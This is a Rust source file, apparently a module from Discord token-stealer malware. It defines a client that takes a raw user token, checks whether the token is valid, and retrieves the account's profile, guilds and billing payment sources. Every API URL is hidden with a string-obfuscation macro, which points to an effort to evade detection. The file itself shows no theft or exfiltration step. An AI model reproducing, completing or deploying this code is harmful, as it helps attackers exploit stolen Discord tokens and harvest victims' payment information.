#![allow(dead_code)]
#![allow(non_snake_case)]


use reqwest::{
    Client as HttpClient,
    header::AUTHORIZATION
};
use anyhow::Result;
use obfstr::obfstr;

use super::user::User;
use super::guild::Guild;

#[derive(Debug)]
pub struct Client {
    pub Token: String,
    http: HttpClient,
}

impl Client {
    
    pub fn new(token: String) -> Self {
        Self {
            Token: token,
            http: HttpClient::new(),
        }
    }

    #[inline]
    pub async fn set_token(&mut self, token: String) {
        self.Token = token;
    }

    pub async fn is_token_valid(&self) -> reqwest::Result<()> {
        self.http.head(obfstr!("https://discord.com/api/v9/users/@me"))
            .header(AUTHORIZATION, self.Token.as_str())
            .send()
            .await?
            .error_for_status()?;

        Ok(())
    }

    pub async fn get_user(&self) -> Result<User> {
        let user = self.http.get(obfstr!("https://discord.com/api/v9/users/@me"))
            .header(AUTHORIZATION, self.Token.as_str())
            .send()
            .await?
            .error_for_status()?
            .json::<User>()
            .await?;
        
        Ok(user)
    }

    pub async fn get_guilds(&self) -> Result<Vec<Guild>> {
        let guilds = self.http.get(obfstr!("https://discord.com/api/v9/users/@me/guilds?with_counts=true"))
            .header(AUTHORIZATION, self.Token.as_str())
            .send()
            .await?
            .error_for_status()?
            .json::<Vec<Guild>>()
            .await?;

        Ok(guilds)
    }

    pub async fn get_giftcodes_raw(&self) -> Result<Option<String>> {

        let codes = self.http.get(obfstr!("https://discord.com/api/v6/users/@me/billing/payment-sources"))
            .header(AUTHORIZATION, self.Token.as_str())
            .send()
            .await?
            .error_for_status()?
            .text()
            .await?;

        if codes.is_empty() || codes.as_str() == "[]" { return Ok(None); }
        Ok(Some(codes))
    }
}